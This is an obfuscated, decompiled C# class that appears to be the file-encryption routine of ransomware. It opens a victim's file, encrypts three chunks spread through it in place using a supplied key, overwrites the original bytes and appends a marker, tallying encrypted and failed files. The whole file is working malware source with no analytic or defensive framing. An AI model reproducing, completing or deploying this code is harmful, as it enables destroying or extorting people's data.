using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using eyWttysFpUD;

namespace VyjVuXvolaw;

internal sealed class HZTGcNttCaj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int ZEmBiqChpdXke(long long_0)
	{
		return (int)long_0;
	}

	public static bool lqncezAjKg(string TBSWcXhDQSzK, string UHfjlwiTjVCLX, string EGEZjJuYtUQ, byte[] eCekdCrvuUinC = null, byte[] FgDhAcXQsHkdyZR = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(TBSWcXhDQSzK, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = ZEmBiqChpdXke(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(UHfjlwiTjVCLX) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(UHfjlwiTjVCLX) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(UHfjlwiTjVCLX) * 1024 * 1024) / 10;
				}
				int jYwRyCiFtEKK = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = aOtMGOGLWnMNw(TBSWcXhDQSzK, fileStream, jYwRyCiFtEKK, num * i);
					array = (CRZFkRWzfSXjW.rqILzTAnaGs ? GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(EGEZjJuYtUQ), FgDhAcXQsHkdyZR) : ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(EGEZjJuYtUQ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					ZOffhwfXDcPny(TBSWcXhDQSzK, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (CRZFkRWzfSXjW.AcumuDDlRST ? Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107399815)) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400831)) + Convert.ToString(UHfjlwiTjVCLX) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400831))) : Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107399815)) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400808)) + Convert.ToString(UHfjlwiTjVCLX) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400808))));
			if (!CRZFkRWzfSXjW.AcumuDDlRST)
			{
				using FileStream fileStream2 = new FileStream(TBSWcXhDQSzK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(TBSWcXhDQSzK, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(eCekdCrvuUinC, 0, eCekdCrvuUinC.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (CRZFkRWzfSXjW.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CRZFkRWzfSXjW.MGkBzYPheHDPb, getString_0(107386275) + TBSWcXhDQSzK + getString_0(107399834) + ex.Message + getString_0(107396437));
				}
				catch (Exception)
				{
				}
			}
			CRZFkRWzfSXjW.uAQgXZmBeIANml++;
			return false;
		}
		CRZFkRWzfSXjW.ywaYFjHsMFpWdbL++;
		return true;
	}

	public static byte[] aOtMGOGLWnMNw(string KmqWBBzxNfeLFo, FileStream KCKXBxfbWKZBs, int JYwRyCiFtEKK, int kxqKepEGJWEy = 0)
	{
		byte[] array = new byte[JYwRyCiFtEKK];
		KCKXBxfbWKZBs.Position = kxqKepEGJWEy;
		KCKXBxfbWKZBs.Read(array, 0, JYwRyCiFtEKK);
		return array;
	}

	public static void ZOffhwfXDcPny(string hflZaRONAWgETW, FileStream bizFwZBXhIgqmP, byte[] rDGfRMatiVUVR, int XDfTqHBDbQ = 0)
	{
		bizFwZBXhIgqmP.Position = XDfTqHBDbQ;
		bizFwZBXhIgqmP.Write(rDGfRMatiVUVR, 0, rDGfRMatiVUVR.Length);
	}

	static HZTGcNttCaj()
	{
		Strings.CreateGetStringDelegate(typeof(HZTGcNttCaj));
	}
}
